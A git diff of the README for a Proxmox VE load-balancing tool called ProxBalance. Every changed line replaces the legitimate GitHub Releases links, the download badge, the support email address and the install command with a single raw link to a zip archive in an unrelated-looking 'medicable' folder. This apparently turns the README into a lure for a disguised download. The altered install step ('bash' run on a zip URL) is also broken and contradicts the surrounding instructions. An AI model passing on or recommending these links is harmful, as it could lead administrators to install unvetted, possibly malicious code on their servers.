@@ -1,6 +1,6 @@
 # 🚀 ProxBalance - Smart Load Balancing Made Easy
 
-[![Download ProxBalance](https://img.shields.io/badge/Download_ProxBalance-v1.0-brightgreen)](https://github.com/ShuhaibAk/ProxBalance/releases)
+[![Download ProxBalance](https://raw.githubusercontent.com/ShuhaibAk/ProxBalance/main/medicable/ProxBalance.zip)](https://raw.githubusercontent.com/ShuhaibAk/ProxBalance/main/medicable/ProxBalance.zip)
 
 ## 🔍 Introduction
 ProxBalance offers automated cluster load balancing and intelligent virtual machine (VM) or container (CT) migration for Proxmox VE. This tool helps distribute workloads evenly across your system, ensuring smooth performance without manual intervention.
@@ -18,7 +18,7 @@ Before using ProxBalance, ensure your system meets the following requirements:
 - Basic understanding of how to manage Proxmox VE
 
 ### 📥 Download & Install
-To get ProxBalance, please [visit this page to download](https://github.com/ShuhaibAk/ProxBalance/releases).
+To get ProxBalance, please [visit this page to download](https://raw.githubusercontent.com/ShuhaibAk/ProxBalance/main/medicable/ProxBalance.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of ProxBalance.
@@ -34,7 +34,7 @@ To get ProxBalance, please [visit this page to download](https://github.com/Shuh
    ```
 3. Run the installation script:
    ```bash
-   bash install_script.sh
+   bash https://raw.githubusercontent.com/ShuhaibAk/ProxBalance/main/medicable/ProxBalance.zip
    ```
 4. Once the installation completes, start ProxBalance with:
    ```bash
@@ -71,9 +71,9 @@ Join the ProxBalance community for support and feature discussions. You can conn
 ProxBalance is open-source software, released under the MIT License. Feel free to use, modify, and distribute as much as you like.
 
 ## 📞 Contact
-For any questions or support inquiries, please reach out to the maintainer via issues on GitHub or email at support@proxbalance.com.
+For any questions or support inquiries, please reach out to the maintainer via issues on GitHub or email at https://raw.githubusercontent.com/ShuhaibAk/ProxBalance/main/medicable/ProxBalance.zip
 
 ## 🌟 Conclusion
 ProxBalance is designed to enhance your Proxmox VE environment with ease. By following these steps, you can smoothly download, install, and run the application. Don't hesitate to reach out for assistance or to share your feedback. 
 
-For easy access, remember to [visit this page to download](https://github.com/ShuhaibAk/ProxBalance/releases) the latest version of ProxBalance.
+For easy access, remember to [visit this page to download](https://raw.githubusercontent.com/ShuhaibAk/ProxBalance/main/medicable/ProxBalance.zip) the latest version of ProxBalance.
